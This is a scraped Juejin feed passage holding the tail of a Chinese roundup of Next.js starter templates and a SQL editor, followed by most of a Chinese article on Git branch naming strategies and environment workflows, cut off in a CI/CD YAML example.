data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.indietools.work" target="_blank" title="https://www.indietools.work" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/def28594012e425cae9795bb9c09aa78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=9rY12YucRDdMLZIua0uY%2BQ8NM2E%3D" alt="" loading="lazy"/></a></p>
<p>Indie Tools 是一个收录独立开发、AI 出海领域最新、最实用的免费工具与资源工具站。让你快速找到所需，专注于创造产品。</p>
<p>独立开发者必备网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.indietools.work" target="_blank" title="https://www.indietools.work" ref="nofollow noopener noreferrer"><code>https://www.indietools.work</code></a></p>
<p>Github: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyaolifeng0629%2FAwesome-independent-tools" target="_blank" title="https://github.com/yaolifeng0629/Awesome-independent-tools" ref="nofollow noopener noreferrer"><code>https://github.com/yaolifeng0629/Awesome-independent-tools</code></a></p>
<p>如果本文能给你提供启发和帮助，感谢各位小伙伴动动小手指，一键三连 (点赞、评论、转发)，给我一些支持和鼓励，谢谢。</p>
<h2 data-id="heading-0">Rapidlaunch</h2>
<h3 data-id="heading-1">总结</h3>
<p>基于 Next.js 的快速启动库，提供 Starter Kits 和组件，加速 Web 开发。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23d3f2005f14400b896e59853b825a17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=z4pS2iH9%2FeyIefQ8UMKjOU%2BxugE%3D" alt="Rapidlaunch" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/rapidlaunch</code></p>
<h3 data-id="heading-2">特性</h3>
<ol>
<li>提供多种 Starter Kits，快速搭建基础架构。</li>
<li>包含即用型 UI 组件，快速拼装界面。</li>
<li>基于 Next.js，支持服务端渲染。</li>
<li>代码开源，结构清晰，易于定制。</li>
</ol>
<h3 data-id="heading-3">使用场景</h3>
<ol>
<li>快速启动新项目原型。</li>
<li>构建后台或营销页面时寻找 UI 模块。</li>
<li>团队统一项目结构和规范。</li>
</ol>
<h3 data-id="heading-4">缺点</h3>
<ol>
<li>维护依赖社区贡献。</li>
<li>绑定 Next.js，不适用其他框架。</li>
</ol>
<h2 data-id="heading-5">precedent</h2>
<h3 data-id="heading-6">总结</h3>
<p>Next.js 项目的精选组件和工具库，加速现代化应用开发。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12df3dfc137b4d08af532f8c732eaedb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=R9i1Y0Rji%2BzhgvecvXa2QbzXiWA%3D" alt="precedent" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/precedent</code></p>
<h3 data-id="heading-7">特性</h3>
<ol>
<li>提供模态框等精选 UI 组件。</li>
<li>包含实用自定义 React Hooks。</li>
<li>内置 Next.js App Router 工具函数。</li>
<li>TypeScript 编写，类型安全。</li>
</ol>
<h3 data-id="heading-8">使用场景</h3>
<ol>
<li>快速启动高质量 Next.js 项目。</li>
<li>统一团队 UI 和代码规范。</li>
<li>构建高体验 Web 应用。</li>
</ol>
<h3 data-id="heading-9">缺点</h3>
<ol>
<li>个人维护，设计可能不合众口。</li>
<li>初学者需时间理解其结构。</li>
</ol>
<h2 data-id="heading-10">Next-JS-Landing-Page-Starter-Template</h2>
<h3 data-id="heading-11">总结</h3>
<p>基于 Next.js 14 的开箱即用着陆页模板，集成完整工具链。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f25d5ba253b34b268a54b7eecbe91f8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=x19V8bRVR6F%2FojpTdq2v449HShg%3D" alt="Next-JS-Landing-Page-Starter-Template" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/next-js-landing-page-starter-template</code></p>
<h3 data-id="heading-12">特性</h3>
<ol>
<li>Next.js 14 + App Router，高性能。</li>
<li>TypeScript + Tailwind CSS 3，类型安全且样式高效。</li>
<li>内置 ESLint、Prettier 等代码质量工具。</li>
<li>预配置 VSCode 和 Netlify 部署。</li>
</ol>
<h3 data-id="heading-13">使用场景</h3>
<ol>
<li>快速启动营销着陆页。</li>
<li>基于高标准模板二次开发。</li>
<li>构建高性能官网或作品集。</li>
</ol>
<h3 data-id="heading-14">缺点</h3>
<ol>
<li>设计基础，需定制品牌风格。</li>
<li>面向开发者，学习成本较高。</li>
</ol>
<h2 data-id="heading-15">Startup is free Next.js template</h2>
<h3 data-id="heading-16">总结</h3>
<p>专为 SaaS 初创公司设计的免费 Next.js 模板，含核心页面与组件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14bb3b773c9943d9b2b84f93629e5122~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=bhN%2FLaDtn0R3i762VKj5J3ITyho%3D" alt="Startup is free Next.js template" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/startup-free-nextjs-saas-template</code></p>
<h3 data-id="heading-17">特性</h3>
<ol>
<li>基于 Next.js，性能与 SEO 优异。</li>
<li>包含主页、定价等 SaaS 必备页面。</li>
<li>提供预构建 UI 组件和布局。</li>
<li>设计现代响应式，适配多端。</li>
<li>开源免费，易于定制。</li>
</ol>
<h3 data-id="heading-18">使用场景</h3>
<ol>
<li>初创公司快速构建官网。</li>
<li>开发者基于高质量模板二次开发。</li>
<li>建立含博客的营销网站。</li>
</ol>
<h3 data-id="heading-19">缺点</h3>
<ol>
<li>通用设计，需定制品牌风格。</li>
<li>仅含前端，需自行集成后端。</li>
</ol>
<h2 data-id="heading-20">next-saas-starter</h2>
<h3 data-id="heading-21">总结</h3>
<p>基于 Next.js 的免费响应式 SaaS 落地页模板，JAMStack 架构。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5016d2d464074e62839461df36bf6573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=4FD%2BU6dAwbbRSJOPIhpOSkFe0d0%3D" alt="next-saas-starter" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/next-saas-starter</code></p>
<h3 data-id="heading-22">特性</h3>
<ol>
<li>Next.js 构建，支持 SSR，SEO 友好。</li>
<li>JAMStack 架构，安全快速。</li>
<li>完全响应式设计。</li>
<li>集成 Tailwind CSS，易定制。</li>
<li>包含 SaaS 核心组件。</li>
</ol>
<h3 data-id="heading-23">使用场景</h3>
<ol>
<li>快速构建 SaaS 营销网站。</li>
<li>获取高性能 Next.js 项目起点。</li>
<li>构建静态化 Web 应用。</li>
</ol>
<h3 data-id="heading-24">缺点</h3>
<ol>
<li>功能基础，需扩展业务逻辑。</li>
<li>仅含前端，需集成后端。</li>
</ol>
<h2 data-id="heading-25">relivator-nextjs-template</h2>
<h3 data-id="heading-26">总结</h3>
<p>基于 Next.js 15 和 React 19 的全栈电商 SaaS 模板，集成支付与认证。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b8c8b408343458a922573cee86f0318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=gFXEQdPiQ6fKi099jbLkxHBPCSo%3D" alt="relivator-nextjs-template" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/relivator-nextjs-template</code></p>
<h3 data-id="heading-27">特性</h3>
<ol>
<li>Next.js 15 + React 19，体验现代。</li>
<li>集成 Auth、支付、UI 库和 ORM。</li>
<li>提供完整电商功能模块。</li>
<li>支持深色模式，Tailwind CSS 定制。</li>
<li>TypeScript 编写，类型安全。</li>
</ol>
<h3 data-id="heading-28">使用场景</h3>
<ol>
<li>快速启动全栈电商或 SaaS 项目。</li>
<li>寻求高集成度 React/Next.js 模板。</li>
<li>构建含支付的用户系统。</li>
</ol>
<h3 data-id="heading-29">缺点</h3>
<ol>
<li>技术栈复杂，上手曲线陡峭。</li>
<li>功能繁多，简单项目可能显得臃肿。</li>
</ol>
<h2 data-id="heading-30">free-nextjs-admin-dashboard</h2>
<h3 data-id="heading-31">总结</h3>
<p>基于 Next.js 和 Tailwind CSS 的免费开源后台管理模板。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0b98016ece427d99fe51dc6964f618~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=G9O7%2Bh%2F8kt2ERxbE4GUigESbfxY%3D" alt="free-nextjs-admin-dashboard" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/free-nextjs-admin-dashboard</code></p>
<h3 data-id="heading-32">特性</h3>
<ol>
<li>Next.js + Tailwind CSS，高效开发。</li>
<li>提供仪表盘、图表等预置页面。</li>
<li>完全免费开源，可商用。</li>
<li>响应式设计，适配多端。</li>
<li>结构清晰，易于定制。</li>
</ol>
<h3 data-id="heading-33">使用场景</h3>
<ol>
<li>快速构建后台管理或仪表盘。</li>
<li>学习 Next.js 实战开发。</li>
<li>项目原型快速开发。</li>
</ol>
<h3 data-id="heading-34">缺点</h3>
<ol>
<li>缺乏高级功能或企业支持。</li>
<li>界面基础，复杂项目需定制。</li>
</ol>
<h2 data-id="heading-35">chadnext</h2>
<h3 data-id="heading-36">总结</h3>
<p>功能丰富的 Next.js 15 全栈启动模板，集成 UI、认证、数据库和支付。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d61bb1f4788e45cda20ad0823f00fb0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=xB2vYQQ27w32bBjEtLf%2F4d2LEjE%3D" alt="chadnext" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/chadnext</code></p>
<h3 data-id="heading-37">特性</h3>
<ol>
<li>Next.js 15 App Router，支持 SSR。</li>
<li>集成 Shadcn/ui 组件库。</li>
<li>内置 LuciaAuth 认证。</li>
<li>使用 Prisma ORM。</li>
<li>预配置 Stripe 支付。</li>
</ol>
<h3 data-id="heading-38">使用场景</h3>
<ol>
<li>快速启动全栈 Web 应用。</li>
<li>构建含支付的 SaaS 产品。</li>
<li>寻求开箱即用的基础框架。</li>
</ol>
<h3 data-id="heading-39">缺点</h3>
<ol>
<li>技术栈固定，灵活性受限。</li>
<li>集成功能多，简单项目略显臃肿。</li>
</ol>
<h2 data-id="heading-40">Next.js-Developer-Portfolio-Starter-Code</h2>
<h3 data-id="heading-41">总结</h3>
<p>基于 Next.js、Tailwind CSS 和 Framer Motion 的开发者作品集模板。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83da96235c44148b5ed46a5cfd79cc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=gZYXr2yqv6jCLgpcs2UCixQyJEs%3D" alt="Next.js-Developer-Portfolio-Starter-Code" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/nextjs-developer-portfolio-starter-code</code></p>
<h3 data-id="heading-42">特性</h3>
<ol>
<li>Next.js 框架，SEO 与性能优异。</li>
<li>Tailwind CSS 样式，响应式设计。</li>
<li>集成 Framer Motion 动画。</li>
<li>包含作品集核心页面。</li>
</ol>
<h3 data-id="heading-43">使用场景</h3>
<ol>
<li>快速搭建个人展示网站。</li>
<li>学习 Next.js 动画实战。</li>
</ol>
<h3 data-id="heading-44">缺点</h3>
<ol>
<li>功能设计基础，需深度定制。</li>
<li>依赖特定技术栈，需学习成本。</li>
</ol>
<h2 data-id="heading-45">Galaxy</h2>
<h3 data-id="heading-46">总结</h3>
<p>专为工程师设计的现代化 SQL 编辑器，集成 AI 辅助与团队协作。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c378e97868446058a26af190c8b01d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948881&amp;x-signature=aITu4MIypdtMzUWAtKjAJu8UTdY%3D" alt="Galaxy" loading="lazy"/></p>
<p>链接: <code>https://www.indietools.work/product/galaxy</code></p>
<h3 data-id="heading-47">特性</h3>
<ol>
<li>高性能，轻量级内存占用。</li>
<li>内置 AI 助手辅助 SQL 编写。</li>
<li>支持实时协作与权限管理。</li>
<li>企业级安全标准。</li>
<li>优化 SQL 工作流体验。</li>
</ol>
<h3 data-id="heading-48">使用场景</h3>
<ol>
<li>高效编写和调试 SQL。</li>
<li>团队协作分析数据。</li>
<li>企业级安全 SQL 开发。</li>
</ol>
<h3 data-id="heading-49">缺点</h3>
<ol>
<li>聚焦 SQL，数据可视化功能有限。</li>
<li>生态系统尚不如老牌工具完善。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[常见的 Git 分支命名策略和实践]]></title>    <link>https://juejin.cn/post/7590011643296890918</link>    <guid>https://juejin.cn/post/7590011643296890918</guid>    <pubDate>2026-01-02T08:43:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296890918" data-draft-id="7590011643296874534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="常见的 Git 分支命名策略和实践"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-02T08:43:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户2685161210756"/> <meta itemprop="url" content="https://juejin.cn/user/534829144487531"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            常见的 Git 分支命名策略和实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/534829144487531/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户2685161210756
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:43:30.000Z" title="Fri Jan 02 2026 08:43:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>针对研发、测试、生产环境，以下是常见的 Git 分支命名策略和实践：</p>
<h2 data-id="heading-0">一、基于 Git Flow 的标准模型（经典）</h2>
<pre><code class="hljs language-lua" lang="lua">master         <span class="hljs-comment">-- 生产环境（稳定版本）</span>
├── hotfix/*   <span class="hljs-comment">-- 生产紧急修复分支</span>
release/*      <span class="hljs-comment">-- 测试环境分支（预发布）</span>
develop        <span class="hljs-comment">-- 研发环境（集成开发分支）</span>
├── feature/*  <span class="hljs-comment">-- 功能开发分支</span>
</code></pre>
<h3 data-id="heading-1">具体对应关系：</h3>



































<table><thead><tr><th>环境</th><th>分支</th><th>说明</th></tr></thead><tbody><tr><td><strong>生产环境</strong></td><td><code>master</code> / <code>main</code></td><td>生产环境的代码，必须是稳定可发布的</td></tr><tr><td><strong>测试环境</strong></td><td><code>release/*</code> (如 <code>release/v1.2.0</code>)</td><td>专门用于测试的分支，从 <code>develop</code> 拉出</td></tr><tr><td><strong>研发环境</strong></td><td><code>develop</code></td><td>日常开发集成环境</td></tr><tr><td><strong>功能开发</strong></td><td><code>feature/*</code> (如 <code>feature/user-auth</code>)</td><td>从 <code>develop</code> 拉出，开发完成后合并回 <code>develop</code></td></tr><tr><td><strong>紧急修复</strong></td><td><code>hotfix/*</code> (如 <code>hotfix/login-bug</code>)</td><td>从 <code>master</code> 拉出，修复后合并回 <code>master</code> 和 <code>develop</code></td></tr></tbody></table>
<p><strong>工作流程</strong>：</p>
<ol>
<li>新功能：<code>feature/*</code> → <code>develop</code> (研发环境)</li>
<li>测试：<code>develop</code> → <code>release/*</code> (测试环境)</li>
<li>上线：<code>release/*</code> → <code>master</code> (生产环境)</li>
<li>紧急修复：<code>hotfix/*</code> → <code>master</code> (生产环境) + <code>develop</code> (研发环境)</li>
</ol>
<hr/>
<h2 data-id="heading-2">二、基于 GitHub/GitLab Flow 的简化模型（现代推荐）</h2>
<pre><code class="hljs language-lua" lang="lua">main/master    <span class="hljs-comment">-- 生产环境</span>
├── staging    <span class="hljs-comment">-- 测试环境分支（可选）</span>
├── develop    <span class="hljs-comment">-- 研发环境分支（可选）</span>
└── feature/*  <span class="hljs-comment">-- 功能分支</span>
</code></pre>
<h3 data-id="heading-3">环境与分支对应：</h3>






























<table><thead><tr><th>环境</th><th>分支</th><th>说明</th></tr></thead><tbody><tr><td><strong>生产环境</strong></td><td><code>main</code> / <code>master</code></td><td>直接对应生产，每次合并都应该是可发布的</td></tr><tr><td><strong>测试环境</strong></td><td><code>staging</code> / <code>test</code></td><td>专门用于测试的分支，从 <code>main</code> 拉出或定期同步</td></tr><tr><td><strong>研发环境</strong></td><td><code>develop</code> (可选)</td><td>集成环境，功能分支合并到此进行初步验证</td></tr><tr><td><strong>功能分支</strong></td><td><code>feature/xxx</code>, <code>fix/xxx</code></td><td>所有开发都在独立分支进行</td></tr></tbody></table>
<p><strong>特点</strong>：</p>
<ul>
<li>更简单直观</li>
<li>功能分支通过 Pull Request 直接合并到 <code>main</code></li>
<li>可使用环境分支或通过 CI/CD 自动部署不同环境</li>
</ul>
<hr/>
<h2 data-id="heading-4">三、实际项目中的常见实践</h2>
<h3 data-id="heading-5">方案 A：三环境独立分支</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 分支结构</span>
main/master     <span class="hljs-comment"># 生产环境</span>
staging         <span class="hljs-comment"># 测试环境（预发布）</span>
develop         <span class="hljs-comment"># 研发环境（日常集成）</span>
</code></pre>
<h3 data-id="heading-6">方案 B：基于标签/提交的部署</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 分支结构</span>
main/master     <span class="hljs-comment"># 主线分支</span>
feature/*       <span class="hljs-comment"># 功能分支</span>

<span class="hljs-comment"># 通过Git标签区分环境</span>
git tag -a v1.0.0-prod -m <span class="hljs-string">"生产环境发布"</span>
git tag -a v1.0.0-staging -m <span class="hljs-string">"测试环境"</span>
</code></pre>
<h3 data-id="heading-7">方案 C：环境特定分支前缀</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 分支命名约定</span>
<span class="hljs-built_in">env</span>/production/xxx   <span class="hljs-comment"># 生产环境相关配置</span>
<span class="hljs-built_in">env</span>/staging/xxx      <span class="hljs-comment"># 测试环境相关配置</span>
<span class="hljs-built_in">env</span>/development/xxx  <span class="hljs-comment"># 研发环境相关配置</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">四、推荐的分支命名规范</h2>
<h3 data-id="heading-9">1. <strong>功能分支</strong>（研发阶段）</h3>
<pre><code class="hljs language-bash" lang="bash">feature/user-authentication    <span class="hljs-comment"># 用户认证功能</span>
feature/add-payment-method     <span class="hljs-comment"># 添加支付方式</span>
feat/search-optimization       <span class="hljs-comment"># 搜索优化</span>
</code></pre>
<h3 data-id="heading-10">2. <strong>修复分支</strong></h3>
<pre><code class="hljs language-bash" lang="bash">fix/login-page-crash           <span class="hljs-comment"># 登录页面崩溃修复</span>
bugfix/memory-leak             <span class="hljs-comment"># 内存泄漏修复</span>
hotfix/critical-security       <span class="hljs-comment"># 紧急安全修复</span>
</code></pre>
<h3 data-id="heading-11">3. <strong>发布分支</strong>（测试阶段）</h3>
<pre><code class="hljs language-bash" lang="bash">release/v1.2.0                 <span class="hljs-comment"># 版本1.2.0发布分支</span>
release/2024-03-update         <span class="hljs-comment"># 2024年3月更新</span>
</code></pre>
<h3 data-id="heading-12">4. <strong>环境配置分支</strong></h3>
<pre><code class="hljs language-bash" lang="bash">config/production              <span class="hljs-comment"># 生产环境配置</span>
config/staging                 <span class="hljs-comment"># 测试环境配置</span>
config/development             <span class="hljs-comment"># 研发环境配置</span>
</code></pre>
<hr/>
<h2 data-id="heading-13">五、最佳实践建议</h2>
<h3 data-id="heading-14">1. <strong>团队约定优先</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在项目README或CONTRIBUTING.md中明确约定</span>
<span class="hljs-comment"># .git分支策略文档示例：</span>
├── main                      <span class="hljs-comment"># 生产环境，保护分支</span>
├── staging                   <span class="hljs-comment"># 测试环境，自动部署</span>
├── develop                   <span class="hljs-comment"># 研发环境，持续集成</span>
├── feature/[ticket-id]-[description]  <span class="hljs-comment"># 功能分支</span>
├── fix/[ticket-id]-[description]      <span class="hljs-comment"># 修复分支</span>
└── release/v[version]        <span class="hljs-comment"># 发布分支</span>
</code></pre>
<h3 data-id="heading-15">2. <strong>CI/CD集成示例</strong></h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml 或 GitHub Actions 配置示例</span>
<span class="hljs-attr">stages:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">build</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">test</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">deploy</span>

<span class="hljs-comment"># 自动部署到不同环境</span>
<span class="hljs-attr">deploy_to_development:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">development</span>
  <span class="hljs-attr">only:</span>
